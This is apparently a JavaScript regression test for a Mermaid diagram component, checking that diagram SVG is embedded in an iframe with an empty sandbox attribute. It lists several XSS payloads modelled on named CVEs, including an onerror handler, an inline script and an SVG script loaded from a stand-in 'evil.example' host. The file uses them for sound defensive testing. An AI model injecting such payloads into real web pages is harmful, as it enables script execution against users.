import { test } from "node:test";
import assert from "node:assert/strict";
import { buildSandboxedSrcDoc } from "../components/mermaid/MermaidDiagramClient.js";

/**
 * XSS regression test for the phase's security requirement: even if
 * mermaid's own sanitizer (securityLevel: "strict") were bypassed --
 * exactly what CVE-2025-54880/54881 and 2026's CSS-injection advisories
 * describe -- the SVG string this app receives is embedded into a
 * `srcDoc` for an iframe with an EMPTY `sandbox` attribute
 * (components/mermaid/MermaidDiagramClient.tsx), which blocks ALL script
 * execution regardless of what the SVG contains. This file cannot execute
 * a real browser's script engine (no jsdom/puppeteer dependency was added
 * for this phase, per the dependency policy), so it verifies the two
 * things that ARE checkable at this layer:
 *
 *   1. `buildSandboxedSrcDoc` does not parse, evaluate, or strip its input
 *      -- a malicious payload passes through as inert text, unmodified,
 *      never executed by this function.
 *   2. The iframe element in MermaidDiagramClient.tsx's source literally
 *      hard-codes `sandbox=""` -- no `allow-scripts` token anywhere near
 *      it -- so no code path in this component can ever grant script
 *      execution to the embedded content, independent of what payload it
 *      receives.
 *
 * A same-process (or manual/browser) verification of the full pipeline is
 * documented in this phase's final report.
 */
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

const CVE_STYLE_PAYLOADS = [
  // CVE-2025-54880-style: architecture-diagram iconText XSS.
  '<img src=x onerror="window.__xss_fired = true">',
  // CVE-2025-54881-style: sequence-diagram label XSS.
  '<script>window.__xss_fired = true;</script>',
  // A raw <script> tag with an external src, as an SVG child.
  '<svg><script xlink:href="https://evil.example/x.js"></script></svg>',
];

test("buildSandboxedSrcDoc passes a malicious payload through as inert text, never executing or stripping it", () => {
  for (const payload of CVE_STYLE_PAYLOADS) {
    const html = buildSandboxedSrcDoc(payload);
    // The payload is present verbatim -- this function's job is wrapping,
    // not sanitizing (sanitization is mermaid's securityLevel:"strict";
    // the sandbox is the defense-in-depth layer, not this function).
    assert.ok(html.includes(payload), `payload should be present verbatim: ${payload}`);
    // The wrapper itself must never introduce a way to escape the intended
    // <body> placement (e.g. no unescaped close-then-reopen of <html>).
    assert.equal(html.indexOf("<!doctype html>"), 0);
    assert.equal((html.match(/<html>/g) ?? []).length, 1);
  }
});

test("the iframe element hard-codes an empty sandbox attribute, with no allow-scripts token on the element itself", () => {
  const filePath = fileURLToPath(new URL("../components/mermaid/MermaidDiagramClient.tsx", import.meta.url));
  const source = readFileSync(filePath, "utf8").replace(/\/\*[\s\S]*?\*\//g, "");
  const iframeMatch = source.match(/<iframe[\s\S]*?\/>/);
  assert.ok(iframeMatch, "expected an <iframe ... /> element in this file");
  const iframeJsx = iframeMatch![0];
  assert.match(iframeJsx, /sandbox=""/, "the rendered iframe must set sandbox to an empty string");
  assert.doesNotMatch(iframeJsx, /allow-scripts/, "no sandbox token may grant script execution to untrusted diagram output");
  assert.doesNotMatch(iframeJsx, /allow-same-origin/, "no sandbox token may grant the iframe access to this app's origin");
});
